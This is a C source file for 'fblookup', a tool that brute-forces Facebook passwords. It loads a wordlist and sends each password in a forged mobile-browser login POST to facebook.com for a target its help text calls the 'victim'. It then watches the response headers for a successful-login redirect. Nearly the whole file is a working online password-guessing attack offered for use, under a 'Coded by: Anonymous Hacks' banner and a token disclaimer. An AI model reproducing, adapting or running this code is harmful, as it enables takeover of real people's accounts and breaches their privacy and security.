#include "fblookup.h"

char PASSWORDS[5049][100] = {};
char *user;
static int total_pass = 0, debug = 0;
SOCKET connect_socket;
FILE *fp_p;
void SSL_init() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
}
const char *help = 
"Usage: fblookup [email/username/id/number] [wordlist] <OPTIONAL>[--debug]\n"
"Positional arguments:\n"
"\t email           This is the victim's email or facebook user name or id or mobile number\n"
"\t wordlist        This must be a file that contains passwords one per line\n"
"OPTIONAL:\n"
"\t --debug         This is a feature which allows a you to save all the login logs in a file\n"
"\t                 This is the HTTP response headers received from the facebook saver.\n";
void menu() {
    #if defined(_WIN32)
    system("cls");
    #else
    system("clear");
    #endif
    
    printf("%s", white);
    printf(" ██████╗██████╗ ██╗     █████╗  █████╗ ██╗  ██╗██╗  ██╗██████╗ \n");
    printf(" ██╔═══╝██╔══██╗██║    ██   ██╗██   ██╗██║ ██╗ ██║  ██║██╔══██ \n");
    printf(" ██████╗██████╔╝██║    ██   ██║██   ██║█████   ██║  ██║██████╝ \n");
    printf(" ██╔═══╝██╔══██╗██║    ██   ██║██   ██║██║ ██╗ ██║  ██║██║      \n");
    printf(" ██║    ██████╔╝██████╗╚█████╔╝╚█████╔╝██║  ██╗╚█████╔╝██║      \n");
    printf(" ╚═╝    ╚═════╝ ╚═════╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝ ╚════╝ ╚═╝      \n");
    printf("     \n");
    printf("[ + ]   Coded by: Anonymous Hacks                     [ + ]  \n");
    printf("[ + ]   GitHub: https://www.github.com/4anonz         [ + ]v2\n");
    printf("%s", blue);
    printf("[ + ]Note!: We won't accept any responsibility for any illegal use[ + ]\n\n");
    printf("%s", reset);

}

const char *GetErrorMsg() {
#if defined(_WIN32)
	static char message[256] { 0 };
	FormatMessage(
	FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
	0, WSAGetLastError(), 0, message, 256, 0);
	char *nl = strrchr(message, '\n');
	if (nl) *nl = 0;
	return message;
#else
	return strerror(errno);
#endif
}

//For establishing TLS/SSL connections
SSL *connect_server() {

    struct addrinfo hints, *peer_addr;
    memset(&hints, 0, sizeof(hints));

    hints.ai_socktype = SOCK_STREAM;
    if(getaddrinfo("www.facebook.com", "443", &hints, &peer_addr)) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" %s\n", GetErrorMsg());
        exit(1);
    }

    connect_socket = socket(peer_addr->ai_family, peer_addr->ai_socktype,
                            peer_addr->ai_protocol);
    if(!IsValidSocket(connect_socket)) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" %s\n", GetErrorMsg);
        exit(1);
    }
    if(connect(connect_socket, peer_addr->ai_addr, peer_addr->ai_addrlen)) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" %s\n", GetErrorMsg);
        exit(1);
    }
    freeaddrinfo(peer_addr);
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if(!ctx) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" SSL_CTX_new() failed\n");
        exit(1);
    }
    SSL *ssl = SSL_new(ctx);
    if(!ssl) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" SSL_new failed\n");
        SSL_CTX_free(ctx);
        exit(1);
    }

    if(!SSL_set_tlsext_host_name(ssl, "www.facebook.com")) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" SSL_set_tlsext_host_name failed ");
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    SSL_set_fd(ssl, connect_socket);
    if(SSL_connect(ssl) == -1) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" SSL_connect failed ");
        ERR_print_errors_fp(stdout);
        exit(1);
    }
    return ssl;
}
int is_password(char *data) {
    if(strstr(data, "Location: https://www.facebook.com/?sk=welcome") || strstr(data, "?sk=welcome"))
        return 1;
    else if(strstr(data, "Location: https://www.facebook.com/checkpoint/?next") || strstr(data, "checkpoint/?next"))
        return 1;
    return 0;
}
char *URL_encode(char *original) {
    char *encoded = (char *) malloc(sizeof(char)*strlen(original)*3+1);
    const char *hex = "0123456789ABCDEF";
    int pos = 0;
    
    for(int i = 0; i < strlen(original); i++) {
        if(('a' <= original[i] && original[i] <= 'z') ||
           ('A' <= original[i] && original[i] <= 'Z') ||
           ('0' <= original[i] && original[i] <= '9')) {
            encoded[pos++] = original[i];   
           } else {
            encoded[pos++] = '%';
            encoded[pos++] = hex[original[i] >> 4];
            encoded[pos++] = hex[original[i] & 15];
        }
    }
    encoded[pos] = '\0';
    return encoded;
}

const char *USER_AGENT = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36";

void send_request_headers(int postlen, SSL *ssl) {

    //int index = random_range(0, 12);
    char buffer[2049];
    sprintf(buffer, "POST /login.php HTTP/1.1\r\n");
    sprintf(buffer + strlen(buffer), "Host: www.facebook.com\r\n");
    sprintf(buffer + strlen(buffer), "Connection: close\r\n");
    sprintf(buffer + strlen(buffer), "Content-Length: %d\r\n", postlen);
    sprintf(buffer + strlen(buffer), "Cache-Control: max-age=0\r\n");
    sprintf(buffer + strlen(buffer), "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n");
    sprintf(buffer + strlen(buffer), "Origin: https://www.facebook.com\r\n");
    sprintf(buffer + strlen(buffer), "User-Agent: %s\r\n", USER_AGENT);
    sprintf(buffer + strlen(buffer), "Content-Type: application/x-www-form-urlencoded\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Encoding: gzip,deflate,sdch\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Language: en-US,en;q=0.8\r\n");
    sprintf(buffer + strlen(buffer), "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n");
    sprintf(buffer + strlen(buffer), "Cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa\r\n");
    sprintf(buffer + strlen(buffer), "\r\n");

    SSL_write(ssl, buffer, strlen(buffer));
}

void brute_() {
    char post[1024];
    int postlen;
    static int pos = 0;
    char response[2048];
    while(1) {
        sprintf(post, "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=%s&pass=%s&default_persistent=0&login=Log+In\r\n", user, PASSWORDS[pos]);
        postlen = strlen(post);
        SSL *ssl = connect_server();
        send_request_headers(postlen, ssl);
        SSL_write(ssl, post, strlen(post));
        SSL_read(ssl, response, sizeof(response));
        if(debug) {
            fprintf(fp_p, "PASSWORD: %s\n", PASSWORDS[pos]);
            fprintf(fp_p, "=================================\n");
            fprintf(fp_p, "%s\n\n", response);
        }
        SSL_shutdown(ssl);
        SSL_free(ssl);
        CloseSocket(connect_socket);
        if(is_password(response) == 1) {
            printf("Password: %s%s%s\n", yellow, PASSWORDS[pos], reset);
            printf("%s", cyan);
            printf("\n[Info]:"); printf("%s", reset);
            printf(" Brute-Force Complete!"); printf("%s", blue);
            printf("[ ✔ ]\n"); printf("%s", reset);
            break;
        }
        printf("\r%d of %d", pos, total_pass);
        fflush(stdout);
        memset(response, 0, sizeof(response));
        if(pos == total_pass) {
            printf("%s", cyan);
            printf("\n[Info]:"); printf("%s", reset);
            printf(" Brute-Force Complete!"); printf("%s", blue);
            printf("[ ✔ ]\n"); printf("%s", reset);
            break;
        }
        pos++;
    }
    fclose(fp_p);
}


int main(int argc, char *argv[]) {
    menu();
    if(argc < 3) {
        fprintf(stderr, "%s%s%s\n", green, help, reset);    
        return 1;
    }
    if(argc == 4) {
        if(strcmp(argv[3], "--debug") == 0)
            debug = 1;
    }
    user = argv[1];
    FILE *fp;
    fp = fopen(argv[2], "r");
    if(fp == NULL) {
        printf("%s", red); printf("[Error]:"); printf("%s", reset);
        printf(" Failed to open password/wordlist file\n");
        return 1;
    }
    if(debug)
        fp_p = fopen(user, "w");
    int pos = 0;
    char *tmp, *en, pass[200];
    while(fgets(pass, sizeof(pass), fp)) {
        if((tmp = strchr(pass, '\n')) != NULL)
            *tmp = 0;
        en =  URL_encode(pass);
        strcpy(PASSWORDS[pos], en);
        free(en);
        pos++;
        total_pass++;
    }
    fclose(fp);
    SSL_init();
    printf("%s", cyan);
    printf("[Info]:"); printf("%s", reset);
    printf(" Fblookup has loaded %d password(s)\n", total_pass);
    printf("%s", cyan);
    printf("[Info]:"); printf("%s", reset);
    printf(" Sit back and take a coffee while I crack the password for you\n");
    brute_();

    return 0;
}
